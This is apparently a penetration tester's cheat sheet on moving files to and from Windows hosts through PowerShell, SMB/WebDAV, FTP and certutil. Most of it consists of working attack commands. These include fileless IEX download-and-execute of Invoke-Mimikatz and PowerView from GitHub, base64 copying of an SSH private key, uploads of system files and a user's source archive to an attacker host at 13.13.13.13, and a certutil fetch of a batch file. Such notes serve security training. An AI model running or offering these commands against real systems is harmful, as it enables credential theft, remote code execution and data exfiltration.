---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Windows

## <mark style="color:yellow;">POWERSHELL</mark>

### <mark style="color:blue;">Base64 Encode & Decode Lin -> Win</mark>

1. **Check SSH Key MD5 Hash**

```bash
md5sum id_rsa
```

2. **Encode SSH Key to Base64**

```bash
cat id_rsa | base64 -w 0;echo

justimaginethisissomerandomhashbecauseyoudontcareandidontcare=
```

3. **Decoding SSH Key on Windows machine**

```powershell
PS C:\> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("justimaginethisissomerandomhashbecauseyoudontcareandidontcare="))
```

4. **Confirming the MD5 Hashes Match**

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

* **Note**: It's not always possible to use this method because cmd.exe has a maximum string length of 8191 characters. And also web shell may error because of this large strings.

### <mark style="color:blue;">Base64 Encode & Decode Win -> Lin</mark>

I explained above how to do encoding in **Linux** and decoding in **Powershell**, now I'll explain opposite: Encode in **Powershell** and decode in **Linux**

1. **Encode File Using Powershell**

```powershell
# If you don't need to copy file to Clipboard, just delete that pipe
PS C:\> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Tools\2025_BloodHound.zip")) | Set-Clipboard
# Get hash
```

2. **Decode Base64 String in Linux**

```bash
echo justimaginethisissomerandomhashbecauseyoudontcareandidontcare= | base64 -d > 2025_BloodHound.zip
# Or if you encoded file into clipboard, just paste output into file, and decode
base64 -d bhoutput.txt > BH_GRAPH.zip
```

3. **Get & Check Hash**

```powershell
PS C:\> Get-FileHash "C:\Tools\2025_BloodHound.zip" -Algorithm MD5 | select Hash 

$ md5sum 2025_BloodHound.zip
```



### <mark style="color:blue;">Web Downloads</mark>

In any version of **PowerShell**, the **System.Net.WebClient** class can be used to download a file over `HTTP, HTTPS or FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource.

1. **File Download**

```powershell
#Syntax: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

#Syntax: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')

PS C:\> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

PS C:\> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```

2. **PowerShell DownloadString - Fileless Method**. Fileless attacks work by using some operationg system functions to download the payload and execute it directly. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias **IEX**

```powershell
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

**Common Errors**

* **Internet Explorer Error**

```powershell
PS C:\> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\carnifex17> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

* **SSL/TLS Untrusted certificate error**

```powershell
PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

### <mark style="color:blue;">PowerShell Web Uploads</mark>

PowerShell doesn't have a built-in upload fucntions, so we need to use **Invoke-WebRequest**. or **Invoke-RestMethod.** Also we can use uploadserver module for Python, to install it we should use:

```bash
pip3 install uploadserver
```

* **Turn On Web Server with Upload**

```bash
python3 -m uploadserver
```

1. **PowerShell Script to Upload a File to Python Upload Server**

```powershell
PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\> Invoke-FileUpload -Uri http://13.13.13.13:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

2. **PowerShell Base64 Web Upload**. Convert file to base64 and send it using Invoke-WebRequest with POST method.

```powershell
PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\> Invoke-WebRequest -Uri http://13.13.13.13:8000/ -Method POST -Body $b64
```

```bash
nc -lvnp 8000
```

```bash
echo <base64> | base64 -d -w 0 > hosts
```

## <mark style="color:yellow;">SMB</mark>

### <mark style="color:blue;">Downloads</mark>

1. **Create the SMB Server**

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

2. **Copy a File from the SMB Server**

```powershell
C:\> copy \\192.168.220.133\share\nc.exe
```

* But in some scenarios there would be an error, which forbids us unauthentificated guest access, so we could creat a smb server with **authentification**

1. **Create the SMB Server with a Username and Password**

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

2. **Mount the SMB Server with Username and Password**

```powershell
C:\> net use n: \\192.168.220.133\share /user:test test
```

### <mark style="color:blue;">Uploads</mark>

SMB Uploads will be more tricky because companies usually block uploads to SMB, cause it could cause a huge problem. BUUUT we could use HTTP or HTTPS protocol in return. It's because when you use SMB, it will first attempt to connect using SMB protocol, and if there's no SMB share available, it'll try to connect using HTTP. But for this we need WebDav protocol, it enables a webserver to behave like a fileserver, which we need. First you need to install it

```bash
sudo pip install wsgidav cheroot
```

1. **Using the WebDav Python module**

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

2. **Connecting to the Webdav Share**. DavWWWRoot isn't a folder, it's a special keyword that tells WebDAV that we are connection to the root of WebDav server. You could use any existing directory when you are connecting, as example `sharefolder`

```powershell
C:\> dir \\13.13.13.13\DavWWWRoot
```

3. **Uploading Files using SMB**

```powershell
C:\> copy C:\Users\john\Desktop\SourceCode.zip \\13.13.13.13\DavWWWRoot\
C:\> copy C:\Users\john\Desktop\SourceCode.zip \\13.13.13.13\sharefolder\
```

## <mark style="color:yellow;">FTP</mark>

### <mark style="color:blue;">Downloads</mark>

* **Installing FTP Server python3 module**

```bash
sudo pip3 install pyftpdlib
```

1. **Setting up a Python3 FTP Server**

```bash
sudo python3 -m pyftpdlib --port 21
```

2. **Transferring Files from an FTP Server Using Powershell**

```powershell
PS C:\> (New-Object Net.WebClient).DownloadFile('ftp://13.13.13.13/file.txt', 'C:\Users\Public\ftp-file.txt')
```

3. **Create a Command File for the FTP Client and Download the Target File**

```bash
C:\> echo open 13.13.13.13 > ftpcommand.txt
C:\> echo USER anonymous >> ftpcommand.txt
C:\> echo binary >> ftpcommand.txt
C:\> echo GET file.txt >> ftpcommand.txt
C:\> echo bye >> ftpcommand.txt
C:\> ftp -v -n -s:ftpcommand.txt
ftp> open 13.13.13.13
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\> more file.txt
This is a test file
```

### <mark style="color:blue;">Uploads</mark>

For this we would also use `peftpdlib` but we need to specify the option --write to allow clients to upload files to our attack host.

1. **Starting FTP Server**

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

2. **Powershell Upload File**

```powershell
PS C:\> (New-Object Net.WebClient).UploadFile('ftp://13.13.13.13/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

3. **Create a Command File for the FTP Client to Upload a File**

```powershell
C:\> echo open 13.13.13.13 > ftpcommand.txt
C:\> echo USER anonymous >> ftpcommand.txt
C:\> echo binary >> ftpcommand.txt
C:\> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\> echo bye >> ftpcommand.txt
C:\> ftp -v -n -s:ftpcommand.txt
ftp> open 13.13.13.13

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

## <mark style="color:yellow;">CERTUTIL</mark>

### <mark style="color:blue;">File Transfer</mark>

```powershell
PS C:\> certutil.exe -urlcache -split -f http://13.13.13.13:1337/youknowim.bat youknowim.bat
```

### <mark style="color:blue;">File Encode</mark>

```powershell
C:\> certutil -encode file1 encodedfile
```

### <mark style="color:blue;">File Decode</mark>

```powershell
C:\> certutil -decode encodedfile file2
```
